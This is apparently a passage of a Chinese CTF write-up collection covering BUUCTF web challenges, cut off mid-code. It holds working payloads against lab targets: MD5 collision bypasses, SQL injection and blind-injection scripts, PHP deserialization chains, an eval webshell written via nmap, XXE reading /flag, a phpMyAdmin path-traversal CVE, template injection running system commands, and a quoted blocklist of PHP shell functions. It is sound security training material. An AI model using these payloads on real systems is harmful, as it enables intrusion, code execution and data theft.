哈希计算的原始字符串数据。可以是任意长度的文本信息，例如用户密码、文件内容等。 raw：这是一个可选参数，不同编程语言对该参数的处理和含义可能有所不同，但一般来说： 当 raw 为 true 或者类似表示真的值时，函数会返回原始的 128 位（16 字节）二进制格式的哈希值。 当 raw 为 false 或者类似表示假的值时，函数会返回以 32 位十六进制字符串形式表示的哈希值。 接下来是md5弱比较,开头为0e就行\n1 2 3 4 5 6 7 MAUXXQC 0e478478466848439040434801845361 IHKFRNS 0e256160682445802696926137988570 GZECLQZ 0e537612333747236407713628225676 GGHMVOE 0e362766013028313274586933780773 GEGHBXL 0e248776895502908863709684713578 EEIZDOI 0e782601363539291779881938479162 DYAXWCA 0e424759758842488633464374063001 然后是md5强比较，数组绕过\n1 2 3 4 5 param1[]=1\u0026amp;param2[]=2 或者确实有a!=b但是MD5值相同的 param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2\u0026amp;param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2 或者 a=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2\u0026amp;b=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2 21、[HCTF 2018]admin 随便注册账号有个修改密码的选项\n查看源码\n这里有一个链接但是失效了，网上找别人的wp,得到secret_key=ckj123，需要伪造session\n然后改session,得到flag\nunicode欺骗，源码里面有strlower函数，我们创建一个大写的ADMIN账户，会被编译成小写的，然后修改密码就能登入，但随后发现注册和登录都用了转小写，注册ADMIN的计划失败\n1 2 3 def strlower(username): username = nodeprep.prepare(username) return username 这里的nodeprep.prepare存在漏洞\nᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘʀꜱᴛᴜᴠᴡʏᴢ这种编码会先转为大写的，再转为小写，就能伪造admin\n1 ᴀ -\u0026gt; A -\u0026gt; a 注册用户ᴀdmin 登录用户ᴀdmin，变成Admin 修改密码Admin，更改了admin的密码 22、[MRCTF2020]你传你🐎呢 传.htaccess文件把jpg转为php，抓包改文件格式，这里jpg不行要用png，上传蚁剑连接\n23、[ZJCTF 2019]NiZhuanSiWei text用data传值，然后file传useless.php看php内容\n还有一个password要反序列化\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?php class Flag{ //flag.php public $file=\u0026#34;flag.php\u0026#34;; public function __tostring(){ if(isset($this-\u0026gt;file)){ echo file_get_contents($this-\u0026gt;file); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; return (\u0026#34;U R SO CLOSE !///COME ON PLZ\u0026#34;); } } } $a=new Flag(); echo serialize($a); ?\u0026gt; 24、[极客大挑战 2019]HardSQL 空格和/**/被过滤了，用（）绕过，用报错注入\n1 2 3 4 username=1\u0026#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))#\u0026amp;password=1 username=1\u0026#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))),0x7e),1))#\u0026amp;password=1 username=1\u0026#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database()))),0x7e),1))#\u0026amp;password=1 username=1\u0026#39;or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))#\u0026amp;password=1 flag显示不全，substring被过滤，只能用left和right构造\n1 username=1\u0026#39;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))#\u0026amp;password=1 flag{8c32c5d2-2601-4575-b121-a16d5f8c0d2e}\n[网鼎杯 2020 青龙组]AreUSerialz 两种解法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;?php class FileHandler { protected $op=2; protected $filename=\u0026#39;flag.php\u0026#39;; protected $content; } $o = new FileHandler(); $o = urlencode(serialize($o));//有不可打印字符但又不能丢弃，url编码 $o =str_replace(\u0026#39;%00\u0026#39;,\u0026#39;\\00\u0026#39;,$o); //因为检测函数要求字符在ascii码32-125，但是%00不在范围内，要改成\\00 $o =str_replace(\u0026#39;s\u0026#39;,\u0026#39;S\u0026#39;,$o); //改为\\00后，反序列化后不会识别\\00，小写s表示字符串,大写S表示16进制字符串 echo $o; ?\u0026gt; 利用当PHP版本 \u0026gt;= 7.2 时，反序列化对访问类别不敏感。\n直接改为public,读取base64编码后的flag.php\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?php class FileHandler { public $op=2; public $filename=\u0026#39;php://filter/convert.base64-encode/resource=flag.php\u0026#39;; public $content; } $o = new FileHandler(); echo $o = urlencode(serialize($o)); ?\u0026gt; [GXYCTF2019]BabySQli exp\n1 2 \u0026#39; union select 1,\u0026#39;admin\u0026#39;, \u0026#39; 202cb962ac59075b964b07152d234b70 \u0026#39;# 123 源码这里有提示\n联合注入，第二位要填admin，第三位填加密后的password\n[GYCTF2020]Blacklist 堆叠注入\n单引号闭合\n1 1\u0026#39;;show databases;# 1 1\u0026#39;;show tables;# 1 1\u0026#39;;show columns from FlagHere;# 这里想用之前的rename,编码转换都不行\n用handler语句\n1 2 3 4 handler table_name open;handler table_name read first;handler table_name close; handler table_name open;handler table_name read next;handler table_name close; 首先打开数据库，开始读它第一行数据，读取成功后进行关闭操作。 首先打开数据库，开始循环读取，读取成功后进行关闭操作。 或者直接用之前的payload\n1 1\u0026#39;;handler FlagHere open as a;handler a read next;# [CISCN2019 华北赛区 Day2 Web1]Hack World sql注入，但是过滤空格和联合注入，报错注入，用盲注\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import requests import time import re url=\u0026#39;http://1e88c184-cbcd-4755-bc2e-1122d382e665.node5.buuoj.cn:81/index.php\u0026#39; flag = \u0026#39;\u0026#39; for i in range(1,43): max = 127 min = 0 for c in range(0,127): s = (int)((max+min)/2) payload = \u0026#39;1^(ascii(substr((select(flag)from(flag)),\u0026#39;+str(i)+\u0026#39;,1))\u0026gt;\u0026#39;+str(s)+\u0026#39;)\u0026#39; r = requests.post(url,data = {\u0026#39;id\u0026#39;:payload}) time.sleep(0.005) if \u0026#39;Hello, glzjin wants a girlfriend.\u0026#39; in str(r.content): max=s else: min=s if((max-min)\u0026lt;=1): flag+=chr(max) break print(flag) 这里因为是or被过滤用异或符号替代\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import requests import time url=\u0026#39;http://1e88c184-cbcd-4755-bc2e-1122d382e665.node5.buuoj.cn:81/index.php\u0026#39; flag = \u0026#39;\u0026#39; for i in range(1,43): max = 127 min = 0 for c in range(0,127): n = (int)((max+min)/2) payload = \u0026#39;0^(ascii(substr((select(flag)from(flag)),\u0026#39;+str(i)+\u0026#39;,1))\u0026gt;\u0026#39;+str(n)+\u0026#39;)\u0026#39; r = requests.post(url,data = {\u0026#39;id\u0026#39;:payload}) time.sleep(0.005) if \u0026#39;Hello\u0026#39; in str(r.content): min=n else: max=n if((max-min)\u0026lt;=1): flag+=chr(max) print(\u0026#34;\\r\u0026#34;, end=\u0026#34;\u0026#34;) print(flag,end=\u0026#39;\u0026#39;) break [RoarCTF 2019]Easy Java 点help，发现没什么用，抓包改post\n下载下来没用，由于题目名称是java，想到下载web.xml\n下载后面这个class类\n可以下载下来反编译或者这里就直接有base64编码的字符串\n[BSidesCF 2020]Had a bad day 这题主要是用到php://filter伪协议可以套一层协议\n1 category=php://filter/convert.base64-encode/resource=index.php 可以看到自动拼接了php后缀\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php $file = $_GET[\u0026#39;category\u0026#39;]; if(isset($file)) { if( strpos( $file, \u0026#34;woofers\u0026#34; ) !== false || strpos( $file, \u0026#34;meowers\u0026#34; ) !== false || strpos( $file, \u0026#34;index\u0026#34;)){ include ($file . \u0026#39;.php\u0026#39;); } else{ echo \u0026#34;Sorry, we currently only support woofers and meowers.\u0026#34;; } } ?\u0026gt; 1 category=woofers/../flag 尝试目录穿越，直接读取不了flag\n这里用到伪协议可以套一层协议\n1 category=php://filter/convert.base64-encode/index/resource=flag [网鼎杯 2020 朱雀组]phpweb 界面一直在自己刷新我们抓包看看\n可能是func参数为函数然后p为函数值，我们先查看index.php，用file_get_contents,highlight_file() ，show_source()都行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?php $disable_fun = array(\u0026#34;exec\u0026#34;,\u0026#34;shell_exec\u0026#34;,\u0026#34;system\u0026#34;,\u0026#34;passthru\u0026#34;,\u0026#34;proc_open\u0026#34;,\u0026#34;show_source\u0026#34;,\u0026#34;phpinfo\u0026#34;,\u0026#34;popen\u0026#34;,\u0026#34;dl\u0026#34;,\u0026#34;eval\u0026#34;,\u0026#34;proc_terminate\u0026#34;,\u0026#34;touch\u0026#34;,\u0026#34;escapeshellcmd\u0026#34;,\u0026#34;escapeshellarg\u0026#34;,\u0026#34;assert\u0026#34;,\u0026#34;substr_replace\u0026#34;,\u0026#34;call_user_func_array\u0026#34;,\u0026#34;call_user_func\u0026#34;,\u0026#34;array_filter\u0026#34;, \u0026#34;array_walk\u0026#34;, \u0026#34;array_map\u0026#34;,\u0026#34;registregister_shutdown_function\u0026#34;,\u0026#34;register_tick_function\u0026#34;,\u0026#34;filter_var\u0026#34;, \u0026#34;filter_var_array\u0026#34;, \u0026#34;uasort\u0026#34;, \u0026#34;uksort\u0026#34;, \u0026#34;array_reduce\u0026#34;,\u0026#34;array_walk\u0026#34;, \u0026#34;array_walk_recursive\u0026#34;,\u0026#34;pcntl_exec\u0026#34;,\u0026#34;fopen\u0026#34;,\u0026#34;fwrite\u0026#34;,\u0026#34;file_put_contents\u0026#34;); function gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == \u0026#34;string\u0026#34;) { return $result; } else {return \u0026#34;\u0026#34;;} } class Test { var $p = \u0026#34;Y-m-d h:i:s a\u0026#34;; var $func = \u0026#34;date\u0026#34;; function __destruct() { if ($this-\u0026gt;func != \u0026#34;\u0026#34;) { echo gettime($this-\u0026gt;func, $this-\u0026gt;p); } } } $func = $_REQUEST[\u0026#34;func\u0026#34;]; $p = $_REQUEST[\u0026#34;p\u0026#34;]; if ($func != null) { $func = strtolower($func); if (!in_array($func,$disable_fun)) { echo gettime($func, $p); }else { die(\u0026#34;Hacker...\u0026#34;); } } ?\u0026gt; 1 2 3 4 5 6 7 8 9 class Test { var $p = \u0026#34;Y-m-d h:i:s a\u0026#34;; var $func = \u0026#34;date\u0026#34;; function __destruct() { if ($this-\u0026gt;func != \u0026#34;\u0026#34;) { echo gettime($this-\u0026gt;func, $this-\u0026gt;p); } } } 这里可以利用反序列化，来rce，因为gettime函数本质是call_user_func函数，可以rce\n1 2 3 4 5 6 7 8 \u0026lt;?php class Test { var $p = \u0026#34;ls\u0026#34;; var $func = \u0026#34;system\u0026#34;; } $obj = new Test(); echo serialize($obj); ?\u0026gt; 然后前面func传unserialize函数\n都没有我们直接find查找\n或者\n1 2 func=readfile\u0026amp;p=/tmp/flagoefiu4r93 func=unserialize\u0026amp;p=O:4:\u0026#34;Test\u0026#34;:2:{s:1:\u0026#34;p\u0026#34;;s:25:\u0026#34;cat $(find / -name flag*)\u0026#34;;s:4:\u0026#34;func\u0026#34;;s:6:\u0026#34;system\u0026#34;;} 这里好像还有非预期\n\\号后面的命令不会被识别\n1 2 func=\\system\u0026amp;p=find / -name flag* func=\\system\u0026amp;p=cat /tmp/flagoefiu4r93 [BJDCTF2020]The mystery of ip smarty注入\n[BJDCTF2020]ZJCTF，不过如此 读取next.php内容\n下面post传i have a dream\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php $id = $_GET[\u0026#39;id\u0026#39;]; $_SESSION[\u0026#39;id\u0026#39;] = $id; function complex($re, $str) { return preg_replace( \u0026#39;/(\u0026#39; . $re . \u0026#39;)/ei\u0026#39;, \u0026#39;strtolower(\u0026#34;\\\\1\u0026#34;)\u0026#39;, $str ); } foreach($_GET as $re =\u0026gt; $str) { echo complex($re, $str). \u0026#34;\\n\u0026#34;; } function getFlag(){ @eval($_GET[\u0026#39;cmd\u0026#39;]); } 这里发现preg_replace用了/e参数，是存在rce漏洞的\n但是这里的第二个参数固定了，接下来引用这篇：文章 - 深入研究preg_replace与代码执行 - 先知社区\n1 2 3 反向引用 对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 \u0026#39;\\n\u0026#39; 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。 所以这里的 \\1 实际上指定的是第一个子匹配项，然后原来第三个参数输入命令，就会变成第二个，原来的第一个参数写入模糊匹配.*就会匹配现在的第一个参数\\1，然后就会触发/e参数漏洞\n但是.*在php里面，对于传入的非法的 $_GET 数组参数名，会将其转换成下划线，我们改为S*\n最终payload\n1 2 \\S*=${getFlag()}\u0026amp;cmd=system(\u0026#39;ls /\u0026#39;) \\S*=${getFlag()}\u0026amp;cmd=system(\u0026#39;cat /flag\u0026#39;) 这里用${}包裹函数，是php可变变量的原因：PHP: 可变变量 - Manual\n在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 ${phpinfo()} 中的 phpinfo() 会被当做变量先执行，执行后，即变成 ${1} (phpinfo()成功执行返回true)\n[BUUCTF 2018]Online Tool 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;?php if (isset($_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;])) { $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] = $_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;]; } if(!isset($_GET[\u0026#39;host\u0026#39;])) { highlight_file(__FILE__); } else { $host = $_GET[\u0026#39;host\u0026#39;]; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(\u0026#34;glzjin\u0026#34;. $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); echo \u0026#39;you are in sandbox \u0026#39;.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(\u0026#34;nmap -T5 -sT -Pn --host-timeout 2 -F \u0026#34;.$host); } 这里escapeshellarg和escapeshellcmd函数按这样顺序调用有个漏洞\n参考：PHP escapeshellarg()+escapeshellcmd() 之殇\n1 2 3 4 传入的参数是：172.17.0.2\u0026#39; -v -d a=1 经过escapeshellarg处理后变成了\u0026#39;172.17.0.2\u0026#39;\\\u0026#39;\u0026#39; -v -d a=1\u0026#39;，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。 经过escapeshellcmd处理后变成\u0026#39;172.17.0.2\u0026#39;\\\\\u0026#39;\u0026#39; -v -d a=1\\\u0026#39;，这是因为escapeshellcmd对\\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php 最后执行的命令是curl \u0026#39;172.17.0.2\u0026#39;\\\\\u0026#39;\u0026#39; -v -d a=1\\\u0026#39;，由于中间的\\\\被解释为\\而不再是转义字符，所以后面的\u0026#39;没有被转义，与再后面的\u0026#39;配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\\ -v -d a=1\u0026#39;，即向172.17.0.2\\发起请求，POST 数据为a=1\u0026#39;。 然后我们只要把想要执行的语句用单引号括起来加空格就能绕过\n这里最后用nmap命令，nmap有一个参数-oG可以实现将命令和结果写到文件\n1 ?host=\u0026#39; \u0026lt;?php @eval($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt; -oG shell.php \u0026#39; 然后蚁剑连接\n这里解释一下为什么加引号和空格\n如果后面没有加引号，在传文件之后，文件名后会多一个引号\n1 2 3 4 5 6 ?host=\u0026#39; \u0026lt;?php @eval($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt; -oG test.php 因为先经过escapeshellarg()这个函数处理，先会对前面的单引号进行转义，然后再把前面和后面的内容用单引号括起来连接，因为原本这个单引号前面没有内容，所以前面只会多一对单引号 ?host=\u0026#39;\u0026#39;\\\u0026#39;\u0026#39; \u0026lt;?php @eval($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt; -oG test.php\u0026#39; 然后再经escapeshellcmd()函数处理,escapeshellcmd对\\以及最后那个不配对儿的引号进行了转义,还会对这些字符进行转义： ?host=\u0026#39;\u0026#39;\\\\\u0026#39;\u0026#39; \\\u0026lt;\\?php @eval\\($_POST\\[\u0026#34;cmd\u0026#34;\\]\\)\\;\\?\\\u0026gt; -oG test.php\\\u0026#39; 所以最后会多一个单引号 但如果加了引号，但是最后一个引号前面没有加空格，那样文件名后面会多双斜杠\n1 2 ?host=\u0026#39; \u0026lt;?php @eval($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt; -oG test.php\u0026#39; \u0026#39;\u0026#39;\\\\\u0026#39;\u0026#39; \\\u0026lt;\\?\\php @eval\\($_POST\\[\u0026#34;cmd\u0026#34;\\]\\)\\;\\?\\\u0026gt; -oG test.php\u0026#39;\\\\\u0026#39;\u0026#39;\u0026#39; 空格作用就是把文件名后面的双斜杠隔开\n[GXYCTF2019]禁止套娃 目录扫描发现.git后面目录有东西，怀疑git源码泄露\ngithack下载源码\n下载了index.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;?php include \u0026#34;flag.php\u0026#34;; echo \u0026#34;flag在哪里呢？\u0026lt;br\u0026gt;\u0026#34;; if(isset($_GET[\u0026#39;exp\u0026#39;])){ if (!preg_match(\u0026#39;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i\u0026#39;, $_GET[\u0026#39;exp\u0026#39;])) { if(\u0026#39;;\u0026#39; === preg_replace(\u0026#39;/[a-z,_]+\\((?R)?\\)/\u0026#39;, NULL, $_GET[\u0026#39;exp\u0026#39;])) { if (!preg_match(\u0026#39;/et|na|info|dec|bin|hex|oct|pi|log/i\u0026#39;, $_GET[\u0026#39;exp\u0026#39;])) { // echo $_GET[\u0026#39;exp\u0026#39;]; @eval($_GET[\u0026#39;exp\u0026#39;]); } else{ die(\u0026#34;还差一点哦！\u0026#34;); } } else{ die(\u0026#34;再好好想想！\u0026#34;); } } else{ die(\u0026#34;还想读flag，臭弟弟！\u0026#34;); } } // highlight_file(__FILE__); ?\u0026gt; (?R)? : (?R)代表当前表达式，就是这个(/[a-z,_]+((?R)?)/)，所以会一直递归，?表示递归当前表达式0次或1（若是(?R)*则表示递归当前表达式0次或多次，例如它可以匹配a(b(c()d()))）\n只能无参rce了\n构造payload\n1 2 3 4 5 6 7 exp=highlight_file(next(array_reverse(scandir(pos(localeconv()))))); highlight_file() 函数对文件进行语法高亮显示，本函数是show_source() 的别名 next() 输出数组中的当前元素和下一个元素的值。 array_reverse() 函数以相反的元素顺序返回数组。(主要是能返回值) scandir() 函数返回指定目录中的文件和目录的数组。 pos() 输出数组中的当前元素的值。 localeconv() 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是\u0026#34;.\u0026#34;。 loacleconv 函数会固定返回一个 . 然后pos将我们获得的 .返回到我们构造的 payload 使得 scandir能够返回当前目录下的数组（换句话说，就是读出当前目录下的文件）array_reverse()以相反的顺序输出（目的是以正序输出查询出来的内容）然后 next 提取第二个元素（将.过滤出去），最后用highlight_file()给显示出来。\n或者用session_id来获得flag\n1 ?exp=highlight_file(session_id(session_start())); 添加cookie的phpsessid值\n[NCTF2019]Fake XML cookbook xxe漏洞\n直接秒了\n1 2 3 4 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE ANY[ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///flag\u0026#34;\u0026gt; ]\u0026gt; 下面username填\u0026amp;xxe;\n[GWCTF 2019]我有一个数据库 我目录扫描扫不出来只能看别人的了\n有个robots.txt\n没什么用\n但是也扫到phpmyadmin\n1 /phpmyadmin/index.php 版本为4.8.1，有有个cve漏洞\n漏洞复现：phpMyAdmin 4.8.1 远程文件包含 CVE-2018-12613 漏洞复现_phpmyadmin 4.8.1 远程文件包含漏洞(cve-2018-12613) phpmyadm-CSDN博客\n直接抄payload\n1 /phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd 有回显\n直接读flag\n1 /phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag [BJDCTF2020]Mark loves cat byd扫不出来没设timeout,可以把线程调低，但是太慢了，-t调线程\n1 python dirsearch.py -e * -u http://ebc4f861-217c-4e5b-8de7-510518bd30be.node5.buuoj.cn:81/ -t 1 --timeout=2 -x 429 存在git泄露，githack下载源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \u0026lt;?php include \u0026#39;flag.php\u0026#39;; $yds = \u0026#34;dog\u0026#34;; $is = \u0026#34;cat\u0026#34;; $handsome = \u0026#39;yds\u0026#39;; foreach($_POST as $x =\u0026gt; $y){ $$x = $y; } foreach($_GET as $x =\u0026gt; $y){ $$x = $$y; } foreach($_GET as $x =\u0026gt; $y){ if($_GET[\u0026#39;flag\u0026#39;] === $x \u0026amp;\u0026amp; $x !== \u0026#39;flag\u0026#39;){ exit($handsome); } } if(!isset($_GET[\u0026#39;flag\u0026#39;]) \u0026amp;\u0026amp; !isset($_POST[\u0026#39;flag\u0026#39;])){ exit($yds); } if($_POST[\u0026#39;flag\u0026#39;] === \u0026#39;flag\u0026#39; || $_GET[\u0026#39;flag\u0026#39;] === \u0026#39;flag\u0026#39;){ exit($is); } echo \u0026#34;the flag is: \u0026#34;.$flag; 主要利用点在这里\n1 2 3 4 5 6 7 foreach($_POST as $x =\u0026gt; $y){ $$x = $y; } foreach($_GET as $x =\u0026gt; $y){ $$x = $$y; } 我们要求最后输出flag，要绕过三个if很困难，但是如果把exit里面的变量覆盖也能输出flag\n1 2 3 4 5 6 ?yds=flag 这里get传参 $x=yds;$y=flag $$x=$yds;$$y=$flag 满足第二个条件 这样exit就会返回$flag的值 1 2 ?is=flag\u0026amp;flag=flag 满足第三个条件 1 2 3 ?handsome=flag\u0026amp;flag=x\u0026amp;x=flag 这里因为get传参，$x=$flag,flag=x,满足第一个条件 或者直接?handsome=flag\u0026amp;flag=handsome [WUSTCTF2020]朴实无华 这里intval里面的数要小于2020但是+1之后要大于2021\n用到科学计数法，刚开始2e5会被解析成2，但是加一之后会被解析为20001，符合条件\n1 2 3 if (isset($_GET[\u0026#39;md5\u0026#39;])){ $md5=$_GET[\u0026#39;md5\u0026#39;]; if ($md5==md5($md5)) 要求跟原字符串相同的MD5\n只有0e215962017\n[BJDCTF2020]Cookie is so stable cookie有问题，结合这个比赛之前的题目怀疑ssti\n1 {{7*\u0026#39;7\u0026#39;}}回显49说明是twig模板注入 直接上payload\n1 {{_self.env.registerUndefinedFilterCallback(\u0026#34;exec\u0026#34;)}}{{_self.env.getFilter(\u0026#34;cat /flag\u0026#34;)}} [CISCN2019 华东南赛区]Web11 smarty注入\n直接xff头上{system(\u0026lsquo;cat /flag\u0026rsquo;)}\n[MRCTF2020]Ezpop 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 class Modifier { protected $var; public function append($value){ include($value); } public function __invoke(){ $this-\u0026gt;append($this-\u0026gt;var); } } class Show{ public $source; public $str; public function __construct($file=\u0026#39;index.php\u0026#39;){ $this-\u0026gt;source = $file; echo \u0026#39;Welcome to \u0026#39;.$this-\u0026gt;source.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } public function __toString(){ return $this-\u0026gt;str-\u0026gt;source; } public function __wakeup(){ if(preg_match(\u0026#34;/gopher|http|file|ftp|https|dict|\\.\\./i\u0026#34;, $this-\u0026gt;source)) { echo \u0026#34;hacker\u0026#34;; $this-\u0026gt;source = \u0026#34;index.php\u0026#34;; } } } class Test{ public $p; public function __construct(){ $this-\u0026gt;p = array(); } public function __get($key){ $function = $this-\u0026gt;p; return $function(); } } 先找入口__construct，发现__get()函数会返回一个函数可以触发__invoke方法，所以让p=new Modifier(),这里会调用append来读取var的值，我们var设置为伪协议读flag,还剩两个方法没被触发\n__tostring可以由show下面的__wakeup()里面的正则匹配会把source变字符串，所以可以让source=new Show(),触发之后会返回str-\u0026gt;source,这里如果将str传给__get(),由于会输出不存在的变量source成功触发\n所以完整的pop链\n1 new show触发__construct,然后source=new show触发__tostring,str=new test触发__get,p=new Modifier()触发__invoke,最后调用append输出flag 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 \u0026lt;?php class Modifier { protected $var=\u0026#39;php://filter/read=convert.base64-encode/resource=flag.php\u0026#39;; public function append($value){ include($value); } public function __invoke(){ $this-\u0026gt;append($this-\u0026gt;var); } } class Show{ public $source; public $str; public function __construct($file=\u0026#39;index.php\u0026#39;){ $this-\u0026gt;source = $file; echo \u0026#39;Welcome to \u0026#39;.$this-\u0026gt;source.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } public function __toString(){ return $this-\u0026gt;str-\u0026gt;source; } public function __wakeup(){ if(preg_match(\u0026#34;/gopher|http|file|ftp|https|dict|\\.\\./i\u0026#34;, $this-\u0026gt;source)) { echo \u0026#34;hacker\u0026#34;; $this-\u0026gt;source = \u0026#34;index.php\u0026#34;; } } } class Test{ public $p; public function __construct(){ $this-\u0026gt;p = array(); } public function __get($key){ $function = $this-\u0026gt;p; return $function(); } } $a= new Modifier(); $b= new Show(); $c= new Test(); $b-\u0026gt;source=new Show(); $b-\u0026gt;source-\u0026gt;str=$c; $c-\u0026gt;p=$a; echo urlencode(serialize($b)); [安洵杯 2019]easy_web 图片url看起来是base64\n解码看看\n两次base64加一个hex转ascii\n构造index.php读取\n1 TmprMlpUWTBOalUzT0RKbE56QTJPRGN3 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 \u0026lt;?php error_reporting(E_ALL || ~ E_NOTICE); header(\u0026#39;content-type:text/html;charset=utf-8\u0026#39;); $cmd = $_GET[\u0026#39;cmd\u0026#39;]; if (!isset($_GET[\u0026#39;img\u0026#39;]) || !isset($_GET[\u0026#39;cmd\u0026#39;])) header(\u0026#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0\u0026amp;cmd=\u0026#39;); $file = hex2bin(base64_decode(base64_decode($_GET[\u0026#39;img\u0026#39;]))); $file = preg_replace(\u0026#34;/[^a-zA-Z0-9.]+/\u0026#34;, \u0026#34;\u0026#34;, $file); if (preg_match(\u0026#34;/flag/i\u0026#34;, $file)) { echo \u0026#39;\u0026lt;img src =\u0026#34;./ctf3.jpeg\u0026#34;\u0026gt;\u0026#39;; die(\u0026#34;xixi～ no flag\u0026#34;); } else { $txt = base64_encode(file_get_contents($file)); echo \u0026#34;\u0026lt;img src=\u0026#39;data:image/gif;base64,\u0026#34; . $txt . \u0026#34;\u0026#39;\u0026gt;\u0026lt;/img\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } echo $cmd; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; if 